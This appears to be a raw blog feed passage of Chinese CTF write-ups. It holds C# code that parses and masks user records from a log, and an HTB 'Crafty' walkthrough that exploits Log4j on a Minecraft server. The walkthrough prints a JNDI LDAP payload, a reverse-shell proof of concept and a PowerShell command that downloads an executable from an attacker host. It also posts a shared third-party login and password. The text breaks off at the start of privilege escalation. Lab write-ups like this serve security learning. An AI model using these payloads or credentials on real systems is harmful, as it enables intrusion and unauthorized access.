class="hljs-number">17</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_phn</span>(<span class="hljs-params">phn</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(phn[:<span class="hljs-number">3</span>]) <span class="hljs-keyword">in</span> prf<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    rslt = []<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;data.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        rslt = [process_line(line) <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f]<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;2.csv&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>, newline=<span class="hljs-string">&quot;&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        wrt = csv.writer(f)<br>        wrt.writerow([<span class="hljs-string">&#x27;usr&#x27;</span>, <span class="hljs-string">&#x27;nm&#x27;</span>, <span class="hljs-string">&#x27;sx&#x27;</span>, <span class="hljs-string">&#x27;brth&#x27;</span>, <span class="hljs-string">&#x27;idc&#x27;</span>, <span class="hljs-string">&#x27;phn&#x27;</span>])<br>        wrt.writerows(r <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> rslt <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> validate_data(r))<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Data written successfully&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h3 id="data-analy3"><a href="#data-analy3" class="headerlink" title="data-analy3"></a>data-analy3</h3><p>Talk is cheap, show me your code</p><p><del>(永远的 C#！Python 什么的都是渣渣)</del></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">using</span> System.Text;<br><span class="hljs-keyword">using</span> System.Text.Encodings.Web;<br><span class="hljs-keyword">using</span> System.Text.RegularExpressions;<br><span class="hljs-keyword">using</span> System.Web;<br>List&lt;<span class="hljs-built_in">string</span>&gt; validPhoneStart = [<br>    <span class="hljs-string">&quot;734&quot;</span>,<span class="hljs-string">&quot;735&quot;</span>,<span class="hljs-string">&quot;736&quot;</span>,<span class="hljs-string">&quot;737&quot;</span>,<span class="hljs-string">&quot;738&quot;</span>,<span class="hljs-string">&quot;739&quot;</span>,<span class="hljs-string">&quot;747&quot;</span>,<span class="hljs-string">&quot;748&quot;</span>,<span class="hljs-string">&quot;750&quot;</span>,<span class="hljs-string">&quot;751&quot;</span>,<span class="hljs-string">&quot;752&quot;</span>,<span class="hljs-string">&quot;757&quot;</span>,<span class="hljs-string">&quot;758&quot;</span>,<span class="hljs-string">&quot;759&quot;</span>,<span class="hljs-string">&quot;772&quot;</span>,<br>    <span class="hljs-string">&quot;778&quot;</span>,<span class="hljs-string">&quot;782&quot;</span>,<span class="hljs-string">&quot;783&quot;</span>,<span class="hljs-string">&quot;784&quot;</span>,<span class="hljs-string">&quot;787&quot;</span>,<span class="hljs-string">&quot;788&quot;</span>,<span class="hljs-string">&quot;795&quot;</span>,<span class="hljs-string">&quot;798&quot;</span>,<span class="hljs-string">&quot;730&quot;</span>,<span class="hljs-string">&quot;731&quot;</span>,<span class="hljs-string">&quot;732&quot;</span>,<span class="hljs-string">&quot;740&quot;</span>,<span class="hljs-string">&quot;745&quot;</span>,<span class="hljs-string">&quot;746&quot;</span>,<span class="hljs-string">&quot;755&quot;</span>,<br>    <span class="hljs-string">&quot;756&quot;</span>,<span class="hljs-string">&quot;766&quot;</span>,<span class="hljs-string">&quot;767&quot;</span>,<span class="hljs-string">&quot;771&quot;</span>,<span class="hljs-string">&quot;775&quot;</span>,<span class="hljs-string">&quot;776&quot;</span>,<span class="hljs-string">&quot;785&quot;</span>,<span class="hljs-string">&quot;786&quot;</span>,<span class="hljs-string">&quot;796&quot;</span>,<span class="hljs-string">&quot;733&quot;</span>,<span class="hljs-string">&quot;749&quot;</span>,<span class="hljs-string">&quot;753&quot;</span>,<span class="hljs-string">&quot;773&quot;</span>,<span class="hljs-string">&quot;774&quot;</span>,<span class="hljs-string">&quot;777&quot;</span>,<br>    <span class="hljs-string">&quot;780&quot;</span>,<span class="hljs-string">&quot;781&quot;</span>,<span class="hljs-string">&quot;789&quot;</span>,<span class="hljs-string">&quot;790&quot;</span>,<span class="hljs-string">&quot;791&quot;</span>,<span class="hljs-string">&quot;793&quot;</span>,<span class="hljs-string">&quot;799&quot;</span><br>];<br><br><span class="hljs-keyword">var</span> pattern =<br>    <span class="hljs-string">@&quot;dumpio_in \(data-HEAP\): username=(.*?)&amp;name=(.*?)&amp;idcard=(.*?)&amp;phone=(.*?)\n.*\n.*\n.*\n.*\n.*\n.*?\(data-HEAP\): (?:(.*?)\: (.*?)|(.*?))?\\n&quot;</span>;<br><span class="hljs-keyword">var</span> contents = File.ReadAllText(<span class="hljs-string">@&quot;C:\Users\yushi\Downloads\tempdir\DS附件\附件\apache2\error.log&quot;</span>);<br><span class="hljs-keyword">var</span> matches = Regex.Matches(contents, pattern);<br><span class="hljs-keyword">var</span> users = matches<br>    .ToList().Select(t =&gt;<br>        <span class="hljs-keyword">new</span> UserInfo<br>        &#123;<br>            UserName = HttpUtility.UrlDecode(t.Groups[<span class="hljs-number">1</span>].Value),<br>            <span class="hljs-comment">// url decode name</span><br>            Name = HttpUtility.UrlDecode(t.Groups[<span class="hljs-number">2</span>].Value),<br>            Phone = HttpUtility.UrlDecode(t.Groups[<span class="hljs-number">4</span>].Value),<br>            IdCard = HttpUtility.UrlDecode(t.Groups[<span class="hljs-number">3</span>].Value),<br>            Password = HttpUtility.UrlDecode(t.Groups[<span class="hljs-number">6</span>].Value),<br>            Type = Encoding.UTF8.GetString(Convert.FromHexString(<br>                (<span class="hljs-built_in">string</span>.IsNullOrEmpty(t.Groups[<span class="hljs-number">5</span>].Value) ? t.Groups[<span class="hljs-number">7</span>].Value : t.Groups[<span class="hljs-number">5</span>].Value)<br>                .Replace(<span class="hljs-string">&quot;\\x&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>                .Replace(<span class="hljs-string">&quot;\\n&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>                .Replace(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>                .Replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>            )),<br>            Raw = t.Value<br>        &#125;).ToList();<br><br><span class="hljs-keyword">var</span> originalUsers = users.Where(t =&gt; t.Type.Contains(<span class="hljs-string">&quot;录入&quot;</span>)).ToDictionary(t =&gt; t.UserName, t =&gt; t);<br><span class="hljs-keyword">var</span> modifyUsers = users.Where(t =&gt; t.Type.Contains(<span class="hljs-string">&quot;更新&quot;</span>)).ToList();<br><span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">var</span> user <span class="hljs-keyword">in</span> modifyUsers)<br>&#123;<br>    originalUsers[user.UserName] = user;<br>&#125;<br><br><span class="hljs-keyword">var</span> validUsers = originalUsers.Values.Where(CheckUser).ToList();<br><br><span class="hljs-comment">// 数据脱敏</span><br><span class="hljs-keyword">var</span> sb = <span class="hljs-keyword">new</span> StringBuilder();<br>sb.AppendLine(<span class="hljs-string">&quot;username,password,name,idcard,phone&quot;</span>);<br><span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">var</span> user <span class="hljs-keyword">in</span> validUsers)<br>&#123;<br>    sb.AppendLine(<span class="hljs-string">$&quot;<span class="hljs-subst">&#123;MaskUserName(user.UserName)&#125;</span>,<span class="hljs-subst">&#123;Md5Password(user.Password)&#125;</span>,<span class="hljs-subst">&#123;MaskName(user.Name)&#125;</span>,<span class="hljs-subst">&#123;MaskIdCard(user.IdCard)&#125;</span>,<span class="hljs-subst">&#123;MaskPhone(user.Phone)&#125;</span>&quot;</span>);<br>    <span class="hljs-comment">// sb.AppendLine($&quot;&#123;user.UserName&#125;,&#123;user.Password&#125;,&#123;user.Name&#125;,&#123;user.IdCard&#125;,&#123;user.Phone&#125;&quot;);</span><br>&#125;<br><br>File.WriteAllText(<span class="hljs-string">&quot;output.csv&quot;</span>, sb.ToString());<br><br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">MaskUserName</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> userName</span>)</span><br>&#123;<br>    <span class="hljs-comment">// 若只有两个字符则只对最后⼀位使⽤ * 号代替，否则只保留第⼀位和最后⼀位字符，其余都⽤ * 号代替，例如“ab”脱敏后就是“a*”，“abcde”脱敏后就是“a***e”。</span><br>    <span class="hljs-keyword">if</span> (userName.Length == <span class="hljs-number">2</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> userName[<span class="hljs-number">0</span>] + <span class="hljs-string">&quot;*&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">return</span> userName[<span class="hljs-number">0</span>] + <span class="hljs-keyword">new</span> <span class="hljs-built_in">string</span>(<span class="hljs-string">&#x27;*&#x27;</span>, userName.Length - <span class="hljs-number">2</span>) + userName[^<span class="hljs-number">1</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">Md5Password</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> password</span>)</span><br>&#123;<br>    <span class="hljs-keyword">using</span> <span class="hljs-keyword">var</span> md5 = System.Security.Cryptography.MD5.Create();<br>    <span class="hljs-keyword">var</span> inputBytes = Encoding.UTF8.GetBytes(password);<br>    <span class="hljs-keyword">var</span> hashBytes = md5.ComputeHash(inputBytes);<br>    <span class="hljs-keyword">var</span> sb = <span class="hljs-keyword">new</span> StringBuilder();<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">var</span> t <span class="hljs-keyword">in</span> hashBytes)<br>    &#123;<br>        sb.Append(t.ToString(<span class="hljs-string">&quot;x2&quot;</span>));<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> sb.ToString();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">MaskName</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> userName</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (userName.Length == <span class="hljs-number">2</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> userName[<span class="hljs-number">0</span>] + <span class="hljs-string">&quot;*&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">return</span> userName[<span class="hljs-number">0</span>] + <span class="hljs-keyword">new</span> <span class="hljs-built_in">string</span>(<span class="hljs-string">&#x27;*&#x27;</span>, userName.Length - <span class="hljs-number">2</span>) + userName[^<span class="hljs-number">1</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">MaskPhone</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> phone</span>)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> phone.Substring(<span class="hljs-number">0</span>, <span class="hljs-number">3</span>) + <span class="hljs-string">&quot;****&quot;</span> + phone[<span class="hljs-number">7.</span>.];<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">MaskIdCard</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> idCard</span>)</span><br>&#123;<br>    <span class="hljs-comment">// 只保留年份</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;******&quot;</span> + idCard.Substring(<span class="hljs-number">6</span>, <span class="hljs-number">4</span>) + <span class="hljs-string">&quot;********&quot;</span>;<br>&#125;<br><br>Console.ReadLine();<br><br><span class="hljs-function"><span class="hljs-built_in">bool</span> <span class="hljs-title">CheckUser</span>(<span class="hljs-params">UserInfo info</span>)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> CheckUserName(info.UserName) &amp;&amp; CheckName(info.Name) &amp;&amp; CheckPhone(info.Phone) &amp;&amp; CheckIDCard(info.IdCard);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">bool</span> <span class="hljs-title">CheckUserName</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> userName</span>)</span><br>&#123;<br>    <span class="hljs-comment">// should all be number and alphabet</span><br>    <span class="hljs-keyword">return</span> Regex.IsMatch(userName, <span class="hljs-string">&quot;^[A-Za-z0-9]+$&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">bool</span> <span class="hljs-title">CheckPhone</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> phone</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (phone.Length != <span class="hljs-number">11</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">// should all be number</span><br>    <span class="hljs-keyword">if</span> (!Regex.IsMatch(phone, <span class="hljs-string">&quot;^[0-9]+$&quot;</span>))<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> validPhoneStart.Contains(phone.Substring(<span class="hljs-number">0</span>, <span class="hljs-number">3</span>));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">bool</span> <span class="hljs-title">CheckName</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> name</span>)</span><br>&#123;<br>    <span class="hljs-comment">// should all be chinese</span><br>    <span class="hljs-keyword">return</span> Regex.IsMatch(name, <span class="hljs-string">&quot;^[\u4e00-\u9fa5]+$&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">bool</span> <span class="hljs-title">CheckIDCard</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> idNumber</span>)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">if</span> (idNumber.Length == <span class="hljs-number">18</span>)<br>    &#123;<br>        <span class="hljs-built_in">bool</span> check = CheckIDCard18(idNumber);<br>        <span class="hljs-keyword">return</span> check;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-built_in">bool</span> <span class="hljs-title">CheckIDCard18</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> idNumber</span>)</span><br>&#123;<br>    <span class="hljs-built_in">long</span> n = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">long</span>.TryParse(idNumber.Remove(<span class="hljs-number">17</span>), <span class="hljs-keyword">out</span> n) == <span class="hljs-literal">false</span><br>        || n &lt; Math.Pow(<span class="hljs-number">10</span>, <span class="hljs-number">16</span>) || <span class="hljs-built_in">long</span>.TryParse(idNumber.Replace(<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>).Replace(<span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>), <span class="hljs-keyword">out</span> n) == <span class="hljs-literal">false</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">//数字验证  </span><br>    &#125;<br>    <br>    <span class="hljs-built_in">string</span>[] arrVarifyCode = (<span class="hljs-string">&quot;1,0,x,9,8,7,6,5,4,3,2&quot;</span>).Split(<span class="hljs-string">&#x27;,&#x27;</span>);<br>    <span class="hljs-built_in">string</span>[] Wi = (<span class="hljs-string">&quot;7,9,10,5,8,4,2,1,6,3,7,9,10,5,8,4,2&quot;</span>).Split(<span class="hljs-string">&#x27;,&#x27;</span>);<br>    <span class="hljs-built_in">char</span>[] Ai = idNumber.Remove(<span class="hljs-number">17</span>).ToCharArray();<br>    <span class="hljs-built_in">int</span> sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">17</span>; i++)<br>    &#123;<br>        sum += <span class="hljs-built_in">int</span>.Parse(Wi[i]) * <span class="hljs-built_in">int</span>.Parse(Ai[i].ToString());<br>    &#125;<br><br>    <span class="hljs-built_in">int</span> y = <span class="hljs-number">-1</span>;<br>    Math.DivRem(sum, <span class="hljs-number">11</span>, <span class="hljs-keyword">out</span> y);<br>    <span class="hljs-keyword">if</span> (arrVarifyCode[y] != idNumber.Substring(<span class="hljs-number">17</span>, <span class="hljs-number">1</span>).ToLower())<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">//校验码验证  </span><br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">//符合GB11643-1999标准  </span><br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span><br>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> UserName &#123; <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Name &#123; <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Phone &#123; <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> IdCard &#123; <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Password &#123; <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Type &#123; <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Raw &#123; <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Crafty</title>
    <link href="/blog/HTB/HTB%20Crafty/"/>
    <url>/blog/HTB/HTB%20Crafty/</url>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240814120522.png"></p><h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240814115730.png"></p><blockquote><p>80web、25565mc</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240814115808.png"></p><blockquote><p>mc版本1.16.5</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;10.129.19.226 crafty.htb&quot;</span> &gt;&gt; /etc/hosts<br><span class="hljs-built_in">tail</span> -n 1 /etc/hosts<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240814120227.png"></p><h2 id="0x02-web"><a href="#0x02-web" class="headerlink" title="0x02 web"></a>0x02 web</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240814180135.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;10.129.19.226 play.crafty.htb&quot;</span> &gt;&gt; /etc/hosts<br><span class="hljs-built_in">tail</span> -n 1 /etc/hosts<br></code></pre></td></tr></table></figure><p>功能全是未开发，尝试目录爆破：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">feroxbuster -u http://10.129.19.226/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240814180810.png"></p><blockquote><p>没有结果，转向mc服务</p></blockquote><h2 id="0x03-mc"><a href="#0x03-mc" class="headerlink" title="0x03 mc"></a>0x03 mc</h2><blockquote><p>提到mc的rce，大概率就是log4j<br><a href="https://software-sinner.medium.com/exploiting-minecraft-servers-log4j-ddac7de10847">https://software-sinner.medium.com/exploiting-minecraft-servers-log4j-ddac7de10847</a></p></blockquote><p>本质是远程加载恶意类反弹shell，脚本将启动一个LDAP服务器和一个HTTP服务器，通过在游戏聊天框输入类似<code>$&#123;jndi:ldap://localhost:1389/a&#125;</code>的payload通过jndi远程加载恶意类。</p><blockquote><p><a href="https://github.com/kozmer/log4j-shell-poc">https://github.com/kozmer/log4j-shell-poc</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240814181745.png"></p><p>按照文章的利用说明，我们还需要做三个准备：</p><ol><li>因为是windows机器，需要修改poc中的&#x2F;bin&#x2F;sh为cmd.exe</li><li>在同级目录下下载jdk1.8并解压</li><li>准备一个游戏启动器</li></ol><blockquote><p>下载jdk时需要账号，可以在<a href="https://bugmenot.com/view/oracle.com%E8%8E%B7%E5%BE%97%E5%85%AC%E5%BC%80%E8%B4%A6%E5%8F%B7">https://bugmenot.com/view/oracle.com获得公开账号</a><br><a href="mailto:&#x65;&#x72;&#102;&#x65;&#x64;&#x65;&#x40;&#121;&#111;&#112;&#109;&#x61;&#105;&#x6c;&#46;&#x63;&#111;&#109;">&#x65;&#x72;&#102;&#x65;&#x64;&#x65;&#x40;&#121;&#111;&#112;&#109;&#x61;&#105;&#x6c;&#46;&#x63;&#111;&#109;</a><br>Bellapete!1</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240814183057.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar -xf jdk-8u20-linux-x64.tar.gz<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 poc.py --userip 10.10.16.2 --webport 8000 --lport 9999<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240814184154.png"></p><blockquote><p>pcl下载1.16.5启动后，聊天框输入<code>$&#123;jndi:ldap://10.10.16.2:1389/a&#125;</code>触发<br>若出现1.16.5无法添加多人游戏的bug，可参见<a href="https://www.bilibili.com/read/cv24474600/">【技术向】Minecraft1.16.5离线 多人游戏已禁用Bug 修复与分析 - 哔哩哔哩 (bilibili.com)</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240814190700.png"></p><h2 id="0x04-稳固立足点"><a href="#0x04-稳固立足点" class="headerlink" title="0x04 稳固立足点"></a>0x04 稳固立足点</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell <span class="hljs-string">&quot;(New-Object System.Net.WebClient).Downloadfile(&#x27;http://10.10.16.2:8000/fyhypo.exe&#x27;,&#x27;fyhypo.exe&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">gci</span> <span class="hljs-literal">-r</span> <span class="hljs-operator">-file</span> c:\users<br><span class="hljs-built_in">gc</span> C:\users\svc_minecraft\Desktop\user.txt<br></code></pre></td></tr></table></figure><p>探索web目录：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">gci</span> c:\ main.js <span class="hljs-literal">-Recurse</span> <span class="hljs-literal">-EA</span> SilentlyContinue<br></code></pre></td></tr></table></figure><blockquote><p>没有收获</p></blockquote><h2 id="0x05-提权"><a href="#0x05-提权" class="headerlink" title="0x05 提权"></a>0x05 提权</h2><p><strong>枚举</strong></p><blockquote><p>sherlock没有结果、msf的都没有产生会话</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240814200028.png"></p><blockquote><p>换winpeas：</p></blockquote><figure class="highlight bash"><table><tr><td 